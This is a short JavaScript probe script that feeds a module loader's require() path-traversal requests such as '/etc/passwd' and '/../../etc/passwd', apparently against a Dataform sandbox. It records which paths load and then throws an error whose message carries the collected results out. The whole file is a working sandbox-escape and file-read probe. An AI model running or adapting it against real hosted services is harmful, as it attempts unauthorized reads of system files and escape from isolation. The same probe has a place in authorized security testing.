var out={};
function S(x,n){ try { return String(x).slice(0,n||140); } catch(e){ return "?"; } }
// The loader's inner helper `a(candidates, checkFn)` and `c`/`d` check functions are NOT globals,
// but `require(...)` IS the loader. Feed require hostile requests; the loader calls resolve internally.
var reqs = ["@dataform/core","../x","./x","/etc/passwd","..","../..",".","/","./package.json",
  "./definitions/exec.js","/definitions/exec.js","/../../etc/passwd"];
reqs.forEach(function(r){
  try { var v = require(r); out["q:"+r] = "OK keys=" + S(Object.keys(v||{}).slice(0,6).join(","), 90); }
  catch(e){ out["q:"+r] = "EXC:" + S(e, 80); }
});
throw new Error("R8::" + JSON.stringify(out));
